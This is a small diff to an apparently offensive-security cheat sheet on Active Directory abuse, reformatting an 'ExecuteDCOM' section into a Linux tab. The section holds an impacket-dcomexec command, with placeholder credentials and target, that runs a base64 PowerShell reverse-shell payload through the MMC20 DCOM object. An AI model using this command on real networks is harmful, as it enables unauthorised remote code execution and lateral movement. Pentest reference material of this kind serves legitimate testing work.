@@ -5,11 +5,20 @@ tags: ["ExecuteDCOM", "active driectory", "ad", "Windows", "dcsync", "secretsdum
 ---
 
 ---
-### Abuse #1: ExecuteDCOM (From Linux)
+### Abuse #1: ExecuteDCOM
+
+{{< tab set1 tab1 active >}}Linux{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```bash
 # Revshell
 impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET> '<powershell #3 Base64>' -silentcommand -object MMC20
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
